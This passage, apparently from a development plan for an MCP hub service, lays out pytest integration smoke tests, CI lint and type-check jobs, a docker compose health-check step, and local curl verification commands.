- [ ] **Step 1: Create `tests/test_integration_real.py`**

Use `tmp_path` for data dir isolation:

```python
"""Smoke tests with real ASGI app lifecycle. No mocks."""
import asyncio
import os
import pytest
from httpx import ASGITransport, AsyncClient
from src.mcp_hub.main import create_app


@pytest.mark.integration
@pytest.mark.asyncio
async def test_health_endpoint(tmp_path, monkeypatch):
    """App starts, health endpoint responds."""
    monkeypatch.setenv("MCP_HUB_DATA_DIR", str(tmp_path))
    monkeypatch.setenv("MCP_HUB_API_KEY", "")

    app = create_app()
    transport = ASGITransport(app=app, lifespan="on")
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        await asyncio.sleep(0.3)

        resp = await client.get("/admin/api/health")
        assert resp.status_code == 200
        assert resp.json()["status"] == "ok"


@pytest.mark.integration
@pytest.mark.asyncio
async def test_mcp_tools_list(tmp_path, monkeypatch):
    """MCP /mcp endpoint returns tools/list via streamable HTTP."""
    monkeypatch.setenv("MCP_HUB_DATA_DIR", str(tmp_path))
    monkeypatch.setenv("MCP_HUB_API_KEY", "")

    app = create_app()
    transport = ASGITransport(app=app, lifespan="on")
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        await asyncio.sleep(0.3)

        # Streamable HTTP POST
        resp = await client.post("/mcp", json={
            "jsonrpc": "2.0",
            "method": "tools/list",
            "id": 1,
        })
        assert resp.status_code == 200
        data = resp.json()
        assert "result" in data
        assert "tools" in data["result"]
```

- [ ] **Step 2: Add integration job to `ci.yml`**

```yaml
  integration:
    runs-on: ubuntu-latest
    needs: test
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
      - uses: astral-sh/setup-uv@11f9893b081a58869d3b5fccaea48c9e9e46f990
      - run: uv python install 3.12
      - run: uv sync --group dev
      - run: uv run pytest tests/test_integration_real.py -v -m integration
```

- [ ] **Step 3: Add pytest marker in pyproject.toml**

```toml
[tool.pytest.ini_options]
markers = [
    "integration: slow integration tests that need real processes",
]
```

- [ ] **Step 4: Commit**

```bash
git add tests/test_integration_real.py pyproject.toml .github/workflows/ci.yml
git commit -m "test: add real integration smoke tests with tmp_path isolation"
```

### Task 5.2: Add lint + type check to CI

- [ ] **Step 1: Add dev dependencies to `pyproject.toml`**

```toml
[dependency-groups]
dev = [
    "pytest>=8",
    "pytest-asyncio>=0.24",
    "httpx>=0.28",
    "ruff>=0.5",
    "mypy>=1.11",
]
```

- [ ] **Step 2: Add lint job to `ci.yml`**

```yaml
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
      - uses: astral-sh/setup-uv@11f9893b081a58869d3b5fccaea48c9e9e46f990
      - run: uv python install 3.12
      - run: uv sync --group dev
      - name: Ruff
        run: uv run ruff check src/ tests/
      - name: Mypy
        run: uv run mypy src/ --ignore-missing-imports
```

- [ ] **Step 3: Commit**

```bash
git add pyproject.toml .github/workflows/ci.yml
git commit -m "ci: add lint (ruff) and type check (mypy) jobs"
```

---

## Phase 6: Docker Smoke Test (CI)

### Task 6.1: Add docker compose test

- [ ] **Step 1: Add post-build test in ci.yml docker job**

```yaml
      - name: Test with docker compose
        run: |
          docker compose up -d
          for i in $(seq 1 30); do
            if curl -sf http://localhost:26263/admin/api/health | grep -q '"status":"ok"'; then
              echo "✅ Healthy after ${i}s"
              break
            fi
            if [ "$i" -eq 30 ]; then
              echo "❌ Health check timeout"
              docker compose logs
              exit 1
            fi
            sleep 1
          done
          # Verify no ERROR in logs
          if docker compose logs 2>&1 | grep -i "ERROR"; then
            echo "❌ ERROR found in logs"
            exit 1
          fi
          echo "✅ No errors in logs"
          docker compose down
```

- [ ] **Step 2: Commit**

```bash
git add .github/workflows/ci.yml
git commit -m "ci: add docker compose smoke test with health check + error scan"
```

---

## Implementation Order (SERIAL)

Phases must run sequentially due to shared file edits:

```
Phase 1 ──► Phase 2 ──► Phase 3 ──► Phase 4 ──► Phase 5 ──► Phase 6
(Auth)    (Validate)  (Perf+Bug)  (Arch)     (Tests+CI)  (Docker CI)
```

**Non-overlapping write scopes per phase:**
No two phases touch the same file in incompatible ways. But git would conflict on shared files (`main.py`, `admin_router.py`, `proxy_manager.py`). Serial execution is mandatory.

---

## Verification

```bash
# Full test suite
uv run pytest -v
# Expected: ALL pass (unit + integration)

# Lint + type check
uv run ruff check src/ tests/
uv run mypy src/ --ignore-missing-imports
# Expected: 0 errors

# Docker integration
docker compose up --build -d
curl http://localhost:26263/admin/api/health
# Expected: {"status":"ok","servers":0}

# Auth test
curl http://localhost:26263/admin/api/servers -H "X-API-Key: wrong"
# Expected: 401 {"detail":"Invalid or missing API key"}

curl -s http://localhost:26263/admin/api/health
# Expected: 200 (exempt)

# WebUI
curl -s http://localhost:26263/admin/ | head -5
# Expected: <!DOCTYPE html>
```
